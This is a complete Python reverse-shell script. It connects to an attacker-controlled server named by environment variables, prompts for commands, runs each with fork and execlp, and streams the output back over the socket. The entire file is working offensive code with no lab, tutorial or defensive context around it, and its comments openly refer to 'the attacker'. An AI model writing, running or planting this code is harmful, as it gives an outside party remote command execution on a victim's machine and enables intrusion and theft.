import os
import socket
import sys
import select

def execute_command(command, sock):
    """
    Executes a command directly using os.execlp and sends the output back through the socket.
    """
    try:
        # Create pipes for capturing the command's stdout and stderr
        stdout_pipe, stdout_fd = os.pipe()
        stderr_pipe, stderr_fd = os.pipe()

        pid = os.fork()
        if pid == 0:
            # Child process
            os.close(stdout_pipe)  # Close read-end of stdout pipe in child
            os.close(stderr_pipe)  # Close read-end of stderr pipe in child

            # Redirect stdout and stderr to the pipes
            os.dup2(stdout_fd, 1)  # Redirect stdout to the write end of stdout pipe
            os.dup2(stderr_fd, 2)  # Redirect stderr to the write end of stderr pipe

            # Parse the command into the program and its arguments
            args = command.split()
            if not args:
                os._exit(0)  # Exit if no command is given

            # Execute the command using os.execlp
            os.execlp(args[0], *args)
        else:
            # Parent process
            os.close(stdout_fd)  # Close write-end of stdout pipe in parent
            os.close(stderr_fd)  # Close write-end of stderr pipe in parent

            # Read and forward the output
            while True:
                # Use select to wait for data from either stdout or stderr
                rlist, _, _ = select.select([stdout_pipe, stderr_pipe], [], [])
                for ready_fd in rlist:
                    try:
                        data = os.read(ready_fd, 1024)
                        if not data:
                            return  # End of data
                        sock.sendall(data)
                    except OSError:
                        return  # Pipe closed or error occurred
    except Exception as e:
        sock.sendall(f"Error executing command: {e}\n".encode())

def main():
    # Read server IP and port from environment variables
    SERVER_IP = os.getenv("REVERSE_SHELL_SERVER", "127.0.0.1")
    SERVER_PORT = int(os.getenv("REVERSE_SHELL_PORT", "4444"))

    try:
        # Create a socket and connect to the attacker
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_IP, SERVER_PORT))

        # Enter a loop to receive commands and execute them
        while True:
            sock.sendall(b"Shell> ")  # Prompt for the attacker
            command = sock.recv(1024).decode().strip()
            if not command:
                break
            if command.lower() in {"exit", "quit"}:
                break
            execute_command(command, sock)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
